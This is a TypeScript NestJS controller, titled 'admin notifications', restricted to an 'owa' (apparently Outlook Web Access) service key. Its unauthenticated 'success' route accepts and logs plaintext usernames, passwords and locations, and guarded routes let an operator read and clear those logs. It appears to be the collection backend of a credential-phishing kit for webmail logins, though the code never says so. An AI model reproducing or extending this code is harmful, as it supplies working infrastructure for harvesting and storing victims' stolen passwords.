import {
  BadRequestException,
  Body,
  Controller,
  Delete,
  Get,
  HttpCode,
  HttpStatus,
  Param,
  Post,
  Query,
  UseGuards,
} from "@nestjs/common";
import { ApiTags } from "@nestjs/swagger";

import { SessionAuthGuard } from "../auth/session-auth.guard.js";
import { AdminNotificationsService } from "./admin-notifications.service.js";
import type {
  AdminErrorNotification,
  AdminNotificationLogs,
  AdminSuccessNotification,
} from "./admin-notifications.types.js";

@ApiTags("admin notifications")
@Controller("api/services/:serviceKey/notif/admin")
export class AdminNotificationsController {
  constructor(
    private readonly notificationsService: AdminNotificationsService,
  ) {}

  @Post("success")
  @HttpCode(HttpStatus.OK)
  async recordSuccess(
    @Param("serviceKey") serviceKey: string,
    @Body() body: unknown,
  ): Promise<{ status: "ok" }> {
    requireOwaService(serviceKey);
    const payload = readSuccessPayload(body);
    await this.notificationsService.recordSuccess(payload);
    return { status: "ok" };
  }

  @Post("error")
  @HttpCode(HttpStatus.OK)
  async recordError(
    @Param("serviceKey") serviceKey: string,
    @Body() body: unknown,
  ): Promise<{ status: "ok" }> {
    requireOwaService(serviceKey);
    const payload = readErrorPayload(body);
    await this.notificationsService.recordError(payload);
    return { status: "ok" };
  }

  @Get("logs")
  @UseGuards(SessionAuthGuard)
  readLogs(
    @Param("serviceKey") serviceKey: string,
    @Query("limit") rawLimit?: string,
  ): Promise<AdminNotificationLogs> {
    requireOwaService(serviceKey);
    return this.notificationsService.readLogs(readLogLimit(rawLimit));
  }

  @Delete("logs/:logType")
  @UseGuards(SessionAuthGuard)
  async clearLog(
    @Param("serviceKey") serviceKey: string,
    @Param("logType") logType: string,
  ): Promise<{ status: "ok" }> {
    requireOwaService(serviceKey);
    await this.notificationsService.clearLog(readLogType(logType));
    return { status: "ok" };
  }

  @Delete("logs")
  @UseGuards(SessionAuthGuard)
  async clearLogs(@Param("serviceKey") serviceKey: string): Promise<{ status: "ok" }> {
    requireOwaService(serviceKey);
    await this.notificationsService.clearLogs();
    return { status: "ok" };
  }
}

function readSuccessPayload(body: unknown): AdminSuccessNotification {
  if (
    !isRecord(body) ||
    body.success !== true
  ) {
    throw new BadRequestException("Invalid admin success notification");
  }

  return {
    success: true,
    user: readStringField(body, "user"),
    password: readStringField(body, "password"),
    location: readStringField(body, "location"),
  };
}

function readErrorPayload(body: unknown): AdminErrorNotification {
  if (
    !isRecord(body) ||
    body.success !== false
  ) {
    throw new BadRequestException("Invalid admin error notification");
  }

  return {
    success: false,
    error: readStringField(body, "error"),
    stack: readStringField(body, "stack", 16_384),
    user: readStringField(body, "user"),
    location: readStringField(body, "location"),
  };
}

function requireOwaService(serviceKey: string): void {
  if (serviceKey !== "owa") {
    throw new BadRequestException("Admin notifications are supported for OWA only");
  }
}

function isRecord(value: unknown): value is Record<string, unknown> {
  return typeof value === "object" && value !== null;
}

function readStringField(
  value: Record<string, unknown>,
  field: string,
  maximumLength = 4_096,
): string {
  const fieldValue = value[field];
  if (typeof fieldValue !== "string" || fieldValue.length > maximumLength) {
    throw new BadRequestException(`Invalid admin notification field: ${field}`);
  }

  return fieldValue;
}

function readLogLimit(rawLimit: string | undefined): number {
  if (rawLimit === undefined) {
    return 100;
  }

  const limit = Number(rawLimit);
  if (!Number.isInteger(limit) || limit < 1 || limit > 200) {
    throw new BadRequestException("Log limit must be an integer from 1 to 200");
  }

  return limit;
}

function readLogType(value: string): "success" | "error" {
  if (value !== "success" && value !== "error") {
    throw new BadRequestException("Log type must be success or error");
  }

  return value;
}
